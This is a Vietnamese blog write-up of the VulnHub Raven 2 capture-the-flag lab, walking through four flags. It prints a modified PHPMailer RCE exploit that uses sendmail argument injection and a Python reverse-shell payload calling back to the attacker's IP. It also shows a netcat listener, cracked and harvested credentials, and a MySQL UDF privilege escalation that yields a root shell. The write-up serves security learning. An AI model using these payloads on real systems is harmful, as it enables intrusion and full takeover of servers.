## Mở đầu
- Dạo này mình rất có hứng thú với mấy bài lab trên VulnHub.com. Lần này lại là một bài nữa, có thể chọc ngoáy khá nhiều vấn đề ở bài này. Bạn nào muốn build lên làm thử thì qua link này [Raven: 2](https://www.vulnhub.com/entry/raven-2,269/)
- Thôi thì bắt đầu vào chiến thôi. Bài này có tất cả là 4 cờ. Mình đi theo hướng tìm lần lượt 4 cờ luôn nhé.
## Tấn công
- Bắt đầu thì vẫn công việc quen thuộc quét `nmap` các thứ thì giống các bài lab trước đó của mình nhé.
- Quét được địa chỉ ip của nó là `http://192.168.19.17/`, mở ra xem có gì không nào.

![](https://images.viblo.asia/9cebd111-6d0c-492f-b24d-8488d87cdb8d.png)

- Hừm :anguished: chả có gì, thôi quét xem có thư mục nào là lạ k. Quét bằng `dirb` thì có chỗ này cần lưu ý nè
    ```bash
    ---- Entering directory: http://192.168.19.17/vendor/ ----
    (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
        (Use mode '-w' if you want to scan it anyway)

    ---- Entering directory: http://192.168.19.17/wordpress/ ----
    ```
- Thử vào `http://192.168.19.17/vendor/` thì 

![](https://images.viblo.asia/8c631b73-827e-4cb4-95dc-097023f30277.png)

- Cờ thứ nhất ở `/PATH/` nha =))

![](https://images.viblo.asia/00fdad2d-53a4-480c-b6f8-419468f5ddc8.png)

- Sau một hồi đọc các file trong `/vendor/` thì biết được trang này sử dụng PHPMailer phiên bản 5.2.16. Các bạn có thể kiểm tra ở file VERSION ở `/vendor/` kia kìa :D
- Sử dụng exploit này :D [PHPMailer < 5.2.18 - Remote Code Execution (Python)](https://www.exploit-db.com/exploits/40974)
- Nhưng mà cần sửa sang lại một chút.
    ```python
    target = 'http://192.168.19.17/contact.php'
    backdoor = '/backdoor.php'

    payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.19.100\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
    fields={'action': 'submit',
            'name': payload,
            'email': '"minhtuan\\\" -OQueueDirectory=/tmp -X/var/www/html/backdoor.php hacker\" @gmail.com',
            'message': 'Pwned'}
    ```
- Run lên thôi. Kết quả sẽ như này 


- Ở bên máy mình mở `nc -lvp 4444` rồi qua trình duyệt vào `http://192.168.19.17/backdoor.php`. Ta đã remote được rồi :D
- Thêm `python -c 'import pty;pty.spawn("/bin/bash")'` đọc cho dễ :D
- Flag2 nằm ở thư mục `/var/www/flag2.txt` flag2{6a8ed560f0b5358ecf844108048eb337}
- Tiếp tục tìm đến flag3. Thực ra là flag3 này mình tìm thấy đầu tiên luôn, trước cả flag1. Các bạn còn nhớ đến cái link `http://192.168.19.17/wordpress/ ` mà vừa nãy quét được bằng `dirb` không. Vào trang đấy thì chưa thấy có css. Thử bấm nút search thì ra link `http://raven.local/wordpress/?s=`. 
- Sử dụng câu lệnh terminal `sudo echo "192.168.19.17 raven.local" > /etc/hosts` rồi vào `http://raven.local/wordpress`.

![](https://images.viblo.asia/e4f13488-38e6-4d17-b54e-424352f0ed6a.png)

- Đẹp đẽ hơn tý rồi. Sử dụng `wpscan` có sẵn trên `kali linux` để quét xem trang có dính gì không.
    ```bash
    [+] Upload directory has listing enabled: http://raven.local/wordpress/wp-content/uploads/
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%
    ```
- Quét thấy trang này khả thi tý tý :v, vào thì hơi bất ngờ xíu :v

![](https://images.viblo.asia/5f0aa6e0-54ff-467e-b57e-1708f9d31daa.png)

![](https://images.viblo.asia/d476c9c8-0cd4-455c-90da-5ee755770575.png)

- Flag3 đây rồi. Mình kiếm được vài thứ nữa :v
    ```bash
    [+] michael
    | Detected By: Author Posts - Author Pattern (Passive Detection)
    | Confirmed By:
    |  Rss Generator (Passive Detection)
    |  Wp Json Api (Aggressive Detection)
    |   - http://raven.local/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
    |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
    |  Login Error Messages (Aggressive Detection)

    [+] steven
    | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
    | Confirmed By: Login Error Messages (Aggressive Detection)
    ```
- Sử dụng `wpscan` brute force được mật khẩu của `steven` là `LOLLOL1`. Nhưng thôi, đến đây đã, quay lại cái remote shell kia thôi :D. (Thực ra mình lấy được mật khẩu, đang sung sướng `ssh` đến thằng `steven` nhưng đếu được :()
    ```bash
    www-data@Raven:/var/www$ ps uax | grep mysql
    ps uax | grep mysql
    root       543  0.0  0.1   4340  1608 ?        S    Jun20   0:00 /bin/sh /usr/bin/mysqld_safe
    root       909  0.0  5.1 816988 52956 ?        Sl   Jun20   0:08 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
    www-data  1783  0.0  0.0  11136   984 pts/4    S+   01:26   0:00 grep mysql
    www-data@Raven:/var/www$ 
    ```
- Thấy được là mysql đang chạy ở quyền root. Thử tìm kiếm mấy cái exploit thì kiếm được cái này https://www.exploit-db.com/exploits/46249
- `wget https://www.exploit-db.com/download/46249` sử dụng câu lệnh này tải exploit này về rồi đổi tên thành 46249.py

![](https://images.viblo.asia/44140688-7e00-465f-a249-d0e5a35f122f.png)

- À nó yêu cầu username và password của mysql, trong thằng `wordpress` này có file `wp-config.php` ở thư mục `/wordpress/`. Vào đọc thì biết được username:password là `root:R@v3nSecurity`. Có đủ thứ mình cần rồi. Chạy thử cái coi sao.
    ```bash
    www-data@Raven:/var/www/html$ python 46249.py --username root --password R@v3nSecurity
    <l$ python 46249.py --username root --password R@v3nSecurity                 
    Plugin dir is /usr/lib/mysql/plugin/
    Trying to create a udf library...
    UDF library crated successfully: /usr/lib/mysql/plugin/udf9609.so
    Trying to create sys_exec...
    ERROR 1125 (HY000) at line 1: Function 'sys_exec' already exists
    Checking if sys_exec was crated...
    sys_exec was found: *************************** 1. row ***************************
    name: sys_exec
    ret: 2
    dl: udf5766.so
    type: function

    Generating a suid binary in /tmp/sh...
    +-------------------------------------------------------------------------+
    | sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh') |
    +-------------------------------------------------------------------------+
    |                                                                       0 |
    +-------------------------------------------------------------------------+
    Trying to spawn a root shell...
    # 
    ```
    ```bash
    # whoami
    whoami
    root
    # 
    ```
- Ấy chà chà, có root rồi, vào `/root` lấy nốt cái flag cuối thôi :3
    ```bash
    # cd /root
    cd /root
    # ls
    ls
    flag4.txt
    # cat flag4.txt
    cat flag4.txt
    ___                   ___ ___ 
    | _ \__ ___ _____ _ _ |_ _|_ _|
    |   / _` \ V / -_) ' \ | | | | 
    |_|_\__,_|\_/\___|_||_|___|___|
                            
    flag4{df2bc5e951d91581467bb9a2a8ff4425}

    CONGRATULATIONS on successfully rooting RavenII

    I hope you enjoyed this second interation of the Raven VM

    Hit me up on Twitter and let me know what you thought: 

    @mccannwj / wjmccann.github.io
    # 
    ```
## Tổng kết
- Bài này khá là thú vị, nó chạy nhiều thứ trên con web này, phần cũng để đánh lừa, phần cũng để mình mất thời gian hơn. Nhưng đây là một trải nghiệm khá thú vị :D. Chúc các bạn thành công :v
- Cảm ơn anh @vigov5 đã cướp giúp em quả flag cuối =))